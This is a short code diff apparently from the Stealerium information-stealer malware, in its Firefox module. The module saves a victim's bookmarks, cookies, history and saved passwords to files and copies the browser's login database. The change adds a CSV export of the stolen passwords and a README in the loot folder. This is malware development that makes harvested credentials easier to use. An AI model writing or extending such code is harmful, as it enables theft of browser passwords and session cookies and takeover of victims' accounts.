@@ -27,7 +27,10 @@ namespace Stealerium.Target.Browsers.Firefox
                         CBrowserUtils.WriteBookmarks(bookmarks, bSavePath + "\\Bookmarks.txt");
                         CBrowserUtils.WriteCookies(cookies, bSavePath + "\\Cookies.txt");
                         CBrowserUtils.WriteHistory(history, bSavePath + "\\History.txt");
-                        CBrowserUtils.WritePasswords(passwords, bSavePath + "\\Passwords.txt");
+                        CBrowserUtils.WritePasswordsToTxt(passwords, bSavePath + "\\Passwords.txt");
+                        CBrowserUtils.WritePasswordsToCsv(passwords, bSavePath + "\\Passwords.csv");
+                        // Create a README.txt file in the directory
+                        CBrowserUtils.CreateReadme(bSavePath);
                         // Copy all Firefox logins
                         CLogins.GetDbFiles(browser + "\\Profiles\\", bSavePath);
                     }
